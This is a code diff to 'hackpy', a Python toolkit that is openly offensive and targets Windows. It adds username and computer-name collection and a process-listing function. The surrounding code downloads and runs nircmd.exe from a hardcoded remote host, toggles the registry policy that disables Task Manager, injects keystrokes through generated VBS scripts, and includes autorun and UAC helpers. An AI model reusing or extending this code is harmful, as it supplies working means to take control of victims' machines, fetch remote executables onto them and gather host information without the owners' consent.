@@ -24,16 +24,24 @@ global server_url
 server_url = 'http://f0330673.xsph.ru'
 
 # Install path
-global module_location
-module_location = os.environ['TEMP'] + '\\hackpy'
+try:
+    global module_location
+    module_location = os.environ['TEMP'] + '\\hackpy'
+except:
+    raise('ERROR! Hackpy created only for Windows systems!')
+
 # Create temp folders
 for folder in ['', '\\executable', '\\tempdata']:
     if not os.path.exists(module_location + folder):
         os.mkdir(module_location + folder)
 
+# Create variables
+username = os.getenv('USERNAME')
+computername = os.getenv('COMPUTERNAME')
+
 # Load file from URL
-def wget(link, output = None):
-	return wget_download(link, bar = None, out = output)
+def wget(url, output = None, bar = None):
+	return wget_download(url, bar = bar, out = output)
 
 # Load all modules
 def load_all():
@@ -63,7 +71,7 @@ def autorun(path, state = True):
 def sendkey(key):
 	##|
 	##| SendKey('Hello my L0rd!!{ENTER}')
-	##| Other keys: https://pastebin.com/Ns3P7UiH
+	##| All keys: https://pastebin.com/Ns3P7UiH
 	##|
     tempfile = module_location + r'\tempdata\keyboard.vbs'
     with open(tempfile, 'w') as keyboard_path:
@@ -264,7 +272,7 @@ class command:
     def nircmdc(recived_command):
         if not os.path.exists(module_location + r'\executable\nircmd.exe'):
             wget_download(server_url + '/HackPy/nircmd.exe', bar = None, out = module_location + r'\executable\nircmd.exe')
-        command.system(module_location + r'\executable\nircmd.exe ' + recived_command + ' > ' + os.devnull)
+        return command.system(module_location + r'\executable\nircmd.exe ' + recived_command + ' > ' + os.devnull)
 
 
 
@@ -311,6 +319,7 @@ class taskmanager:
 	##| hackpy.taskmanager.kill('process_name.exe')
 	##| hackpy.taskmanager.start('process_name.exe')
 	##| hackpy.taskmanager.find('process_name.exe') # return True/False
+    ##| hackpy.taskmanager.list() # return all process list
 	##|
     def enable():
         command.system('@reg.exe ADD "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /f /v "DisableTaskMgr" /t REG_DWORD /d 0' + ' > ' + os.devnull)
@@ -350,6 +359,23 @@ IF "%ERRORLEVEL%"=="0" (
             except:
                 pass
         return eval(data.split()[0])
+
+    def list():
+        random_number = str(random.randint(1, 99999))
+        list_path = module_location + r'\tempdata\process_list_' + random_number + '.txt'
+        command.system('@tasklist > ' + list_path)
+        # Read task list file
+        with open(list_path, 'r') as file:
+            process_list = []
+            for line in file.readlines():
+                line = line.replace('\n', '').split()
+                if line:
+                    process = line[0]
+                    if process.endswith('.exe'):
+                        process_list.append(process)
+        os.remove(list_path)
+        return process_list
+
 
 
 class uac:
